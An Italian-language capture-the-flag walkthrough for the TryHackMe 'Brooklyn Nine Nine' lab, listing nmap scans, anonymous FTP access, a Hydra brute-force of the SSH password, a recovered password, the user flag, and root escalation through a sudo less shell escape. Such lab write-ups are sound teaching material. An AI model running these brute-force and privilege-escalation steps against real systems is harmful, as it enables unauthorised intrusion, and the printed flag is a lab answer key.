
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/brooklynninenine

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.92.61 -oG risultatoscan
```

```
sudo nmap -sC -sV -p21,22,80 10.10.92.61 -oN risultatoscan2
```

come si vede dal risultato c'è possibilità di  connettersi in modalità anonima  in ftp
```shell
ftp 10.10.92.61
```
ed entriamo con nome user:
```
anonymous
```
e *password vuota

```
less note_to_jake.txt
```
Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```shell
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.92.61 ssh
```
trovata la password con hydra
[22][ssh] host: 10.10.92.61   login: jake   password: 987654321
e ci connettiamo con ssh
```
ssh jake@10.10.92.61
```

```
cd /home/holt
```

```
cat user.txt
```
user flag!
==ee11cbb19052e40b07aac0ca060c23ee

vediamo a che gruppo appartiene jake
```
id
```
vediamo su che binario cosa abbiamo i permessi
```
sudo -l
```
(ALL) NOPASSWD: /usr/bin/less

cerchiamo i binari SUID
```
find / -perm -4000 -ls 2>/dev/null
```
https://gtfobins.github.io/
less (sudo)

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.


```
cd /tmp
```
creiamo archivio e salviamolo in una cartella

```
echo " ant, ant" > cant
```

```
sudo less /etc/profile
```
```
!/bin/sh
```

```
cd /root
```

```
less root.txt
```
==xxxxxxxxxxxxxxxxxx==
root flag!


